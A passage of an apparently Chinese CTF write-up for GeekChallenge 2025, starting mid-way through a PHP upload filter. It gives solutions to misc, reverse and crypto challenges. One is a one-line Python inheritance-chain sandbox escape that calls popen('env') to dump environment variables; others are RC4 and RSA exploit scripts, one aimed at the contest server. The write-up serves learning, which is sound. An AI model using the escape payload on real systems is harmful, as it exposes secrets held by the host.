class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fh</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$head</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="number">4096</span>);</span><br><span class="line">    <span class="title function_ invoke__">fseek</span>(<span class="variable">$fh</span>, -<span class="number">4096</span>, SEEK_END);</span><br><span class="line">    <span class="variable">$tail</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="number">4096</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="variable">$sample</span> = <span class="variable">$head</span> . <span class="variable">$tail</span>;</span><br><span class="line">    <span class="variable">$lower</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$sample</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$block_list</span> <span class="keyword">as</span> <span class="variable">$pat</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$sample</span>, <span class="variable">$pat</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="comment">// 为避免泄露过多信息，这里不直接 echo sample（你之前有 echo，保持注释）</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$lower</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$pat</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$salt</span> = <span class="string">&#x27;GeekChallenge_2025&#x27;</span>;</span><br><span class="line"><span class="variable">$SANDBOX</span> = <span class="title function_ invoke__">sys_get_temp_dir</span>() . <span class="string">&quot;/uploads_&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$SANDBOX</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$SANDBOX</span>, <span class="number">0700</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No file.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$orig</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$tmp</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload error.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$orig</span>, PATHINFO_EXTENSION));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Bad extension.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line">    <span class="variable">$mime</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$tmp</span>);</span><br><span class="line">    <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="variable">$allowed_mime_types</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Bad mime.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">content_filter</span>(<span class="variable">$tmp</span>, <span class="variable">$BLOCK_LIST</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Content blocked.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newname</span> = <span class="title function_ invoke__">time</span>() . <span class="string">&quot;_&quot;</span> . <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^A-Za-z0-9._-]/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$orig</span>);</span><br><span class="line">    <span class="variable">$dest</span> = <span class="variable">$SANDBOX</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$newname</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp</span>, <span class="variable">$dest</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">500</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Move failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;UPLOAD_OK:&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$newname</span>, ENT_QUOTES);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Dream"><a href="#Dream" class="headerlink" title="Dream"></a>Dream</h3><p>sepolia.etherscan.io搜素0xd8B361E50174c4Ae99E31dCdF10B353C961f9C43，找到下面的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6080604052348015600e575f80fd5b50600436106026575f3560e01c8063cf9a197d14602a575b5f80fd5b60306044565b604051603b9190607c565b60405180910390f35b5f775359437b77336c63306d337430626c30636b636861316e7d805f5260205ff35b5f819050919050565b6076816066565b82525050565b5f602082019050608d5f830184606f565b9291505056fea2646970667358221220974b3f216c3631b694b1fb0452f8c8c6ab797a24697c62ebd80b250622b805e864736f6c63430008190033</span><br></pre></td></tr></table></figure>
<p>hex解码可以看到flag</p>
<h3 id="hidden"><a href="#hidden" class="headerlink" title="hidden"></a>hidden</h3><p>docx改为zip后解压发现word.txt和flag3.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag2：MzYyZ2V5ZGd3dW5rZHdlZQ==</span><br><span class="line">解base64</span><br><span class="line">362geydgwunkdwee</span><br></pre></td></tr></table></figure>

<p>document.xml里找到第一段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;</span><br></pre></td></tr></table></figure>

<p>010editor观察jpg文件发现缺少头部，补上FFD8FFE000104A46494600010101006000600000FF即可看到第三段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sjdmd&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Expression-Parser"><a href="#Expression-Parser" class="headerlink" title="Expression Parser"></a>Expression Parser</h3><p>继承链直接打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[155].__init__.__globals__[&#x27;popen&#x27;](&#x27;env&#x27;).read()</span><br></pre></td></tr></table></figure>

<h2 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Gensh1n"><a href="#Gensh1n" class="headerlink" title="Gensh1n"></a>Gensh1n</h3><p>真正校验在 <code>cleanup()</code>：对输入 <code>s</code>（长度须为 28）执行 <code>RC4(key=&quot;geek2025&quot;)</code>，得到的密文需与全局 <code>result</code> 完全一致，同时 CRC32 一致。<br>由 RC4 可逆，直接计算 <code>s = RC4_decrypt(key=&quot;geek2025&quot;, data=result)</code> 即得 flag。<br>关键信息：</p>
<ul>
<li>KEY：<code>geek2025</code></li>
<li>RESULT（hex）：<code>5259f38a000fe65636e5f033406e56815ae56f876f9f21c9a6bb1651</code></li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ARR = <span class="string">b&quot;geek2025&quot;</span></span><br><span class="line">RESULT = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x59</span>, <span class="number">0xF3</span>, <span class="number">0x8A</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0xE6</span>, <span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0xE5</span>, <span class="number">0xF0</span>, <span class="number">0x33</span>, <span class="number">0x40</span>, <span class="number">0x6E</span>, <span class="number">0x56</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xE5</span>, <span class="number">0x6F</span>, <span class="number">0x87</span>, <span class="number">0x6F</span>, <span class="number">0x9F</span>, <span class="number">0x21</span>, <span class="number">0xC9</span>,</span><br><span class="line">    <span class="number">0xA6</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>, <span class="number">0x51</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_ksa</span>(<span class="params">key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_prga</span>(<span class="params">S, n</span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K = S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">        out.append(K)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">key: <span class="built_in">bytes</span>, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    S = rc4_ksa(key)</span><br><span class="line">    ks = rc4_prga(S, <span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(d ^ k <span class="keyword">for</span> d, k <span class="keyword">in</span> <span class="built_in">zip</span>(data, ks))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag_bytes = rc4_decrypt(ARR, RESULT)</span><br><span class="line">    <span class="built_in">print</span>(flag_bytes.decode())</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="xor-revenge"><a href="#xor-revenge" class="headerlink" title="xor_revenge"></a>xor_revenge</h3><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secert <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pq_xor</span>():</span><br><span class="line">    p=getPrime(<span class="number">512</span>)</span><br><span class="line">    q=getPrime(<span class="number">512</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    <span class="keyword">return</span> n,p^q</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pq_and</span>():</span><br><span class="line">    p=getPrime(<span class="number">512</span>)</span><br><span class="line">    q=getPrime(<span class="number">512</span>)</span><br><span class="line">    r=getPrime(<span class="number">512</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    hint=r&amp;p</span><br><span class="line">    <span class="keyword">return</span> n,p&amp;q,r,hint</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">conn</span>):</span><br><span class="line">    conn.sendline(<span class="string">&quot;welcome_the_facotr_game_just_ez_xor&quot;</span>)</span><br><span class="line">    conn.recvline()</span><br><span class="line">    conn.sendline(<span class="string">&quot;wel_come_to_the_first_1111111_heiheihei&quot;</span>)</span><br><span class="line">    G1 = pq_xor()</span><br><span class="line">    n,gift1=G1[<span class="number">0</span>],G1[<span class="number">1</span>]</span><br><span class="line">    msg1=<span class="string">f&#x27;I can give you \nn=<span class="subst">&#123;n&#125;</span>\ngift1=<span class="subst">&#123;gift1&#125;</span>&#x27;</span></span><br><span class="line">    conn.sendline(msg1)</span><br><span class="line">    p_data=conn.recvline()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=<span class="built_in">int</span>(p_data.strip())</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        conn.sendline(<span class="string">&quot;input error, please send integer p&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">        conn.sendline(<span class="string">&quot;no,that bad p,cyring&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    conn.sendline(<span class="string">&quot;wow,you find p,now you go next one&quot;</span>)</span><br><span class="line">    G2 = pq_and()</span><br><span class="line">    n,gift2,r,hint=G2[<span class="number">0</span>],G2[<span class="number">1</span>],G2[<span class="number">2</span>],G2[<span class="number">3</span>]</span><br><span class="line">    conn.send(<span class="string">f&quot;I will give you \nn=<span class="subst">&#123;n&#125;</span>\n gift2=<span class="subst">&#123;gift2&#125;</span>\n hint=<span class="subst">&#123;hint&#125;</span>\n r=<span class="subst">&#123;r&#125;</span>\n&quot;</span>)</span><br><span class="line">    p1_data = conn.recvline()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = <span class="built_in">int</span>(p1_data.strip())</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        conn.sendline(<span class="string">&quot;input error, please send integer p&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> (n % p != <span class="number">0</span>):</span><br><span class="line">        conn.sendline(<span class="string">&quot;no,that bad p1,cyring again&quot;</span>)</span><br><span class="line">    conn.sendline(<span class="string">f&quot;hajimiyonanbolvduo<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = listen(<span class="number">11451</span>)</span><br><span class="line">    log.info(<span class="string">&quot;服务端已启动，等待连接...&quot;</span>)</span><br><span class="line">    conn = server.wait_for_connection()</span><br><span class="line">    log.info(<span class="string">&quot;有客户端连入！&quot;</span>)</span><br><span class="line">    main(conn)</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;geek.ctfplus.cn&quot;</span></span><br><span class="line">PORT = <span class="number">31067</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_until_n</span>(<span class="params">io</span>):</span><br><span class="line">    data  = io.recvuntil(<span class="string">b&quot;r=&quot;</span>)</span><br><span class="line">    data += io.recvline()</span><br><span class="line">    n = <span class="built_in">int</span>(re.search(<span class="string">rb&quot;n=(\d+)&quot;</span>, data).group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="string">b&quot;hi&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvline()</span><br><span class="line">    io.recvline()</span><br><span class="line">    n1_line = io.recvline().decode().strip()</span><br><span class="line">    n1 = <span class="built_in">int</span>(n1_line.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(n1).encode())</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">    n2 = recv_until_n(io)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(n2).encode())</span><br><span class="line"></span><br><span class="line">    flag_line = io.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(flag_line)         <span class="comment"># hajimiyonanbolvduo&#123;flag...&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="dp-spill"><a href="#dp-spill" class="headerlink" title="dp_spill"></a>dp_spill</h3><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, getPrime, GCD</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> solve_congruence</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">a, m, b, n</span>):</span><br><span class="line">    val, mod = solve_congruence((a, m), (b, n))</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> GCD(p-<span class="number">1</span>, q-<span class="number">1</span>) == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_e</span>(<span class="params">p, q, BITS</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d_p = random.randint(<span class="number">1</span>, <span class="number">1</span> &lt;&lt; BITS)</span><br><span class="line">        d_q = random.randint(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> d_p % <span class="number">2</span> == d_q % <span class="number">2</span>:</span><br><span class="line">            d = CRT(d_p, p - <span class="number">1</span>, d_q, q - <span class="number">1</span>)</span><br><span class="line">            e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    BITS = <span class="number">20</span></span><br><span class="line">    p, q = gen_key()</span><br><span class="line">    n = p * q</span><br><span class="line">    e = get_e(p, q, BITS)</span><br><span class="line">    s = <span class="built_in">str</span>(p + q).encode()</span><br><span class="line">    flag_hash = hashlib.sha256(s).hexdigest()</span><br><span class="line">    flag = <span class="string">f&quot;SYC&#123;&#123;<span class="subst">&#123;flag_hash&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==== RSA Challenge ====&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Public Modulus (n): <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Clue (e): <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recover p + q and submit SYC&#123;sha256(p+q)&#125; as the flag!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">n, e, BITS=<span class="number">20</span></span>):</span><br><span class="line">    inc  = <span class="built_in">pow</span>(<span class="number">2</span>, e, n)               <span class="comment"># 2^e   mod n</span></span><br><span class="line">    val  = <span class="built_in">pow</span>(<span class="number">2</span>, e*<span class="number">1</span> - <span class="number">1</span>, n)         <span class="comment"># 2^&#123;e·1-1&#125; mod n</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> dp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1</span> &lt;&lt; BITS):</span><br><span class="line">        g = gcd(val - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:                 <span class="comment"># 成功找到质因子</span></span><br><span class="line">            p, q = g, n // g</span><br><span class="line">            s   = p + q</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;SYC&#123;&#x27;</span> + sha256(<span class="built_in">str</span>(s).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        val = (val * inc) % n         <span class="comment"># 下一轮：指数 +e</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">59802493250926859707985963604065644706006753432029457979480870189591634515944547801582044132550574140049396756158974108666587177618882259807156459782125677704143102175791607852135852403246382056816004306499712131698646815738798243056590111291799398438023345030391834782966046976995917844819454047154287312391</span></span><br><span class="line">e = <span class="number">55212884840887233646138079973875295799093171847359460085387084716906818593689341421818829383370282800231404248386041253598996862719171485530961860941585382910224531768283026267484780257269526617362183903996384696040145787076592207619279689647074176697837752679360230601598541884491676076657287130000027117241</span></span><br><span class="line">recover_flag(n, e, BITS=<span class="number">20</span>)</span><br></pre></td></tr></table></figure>

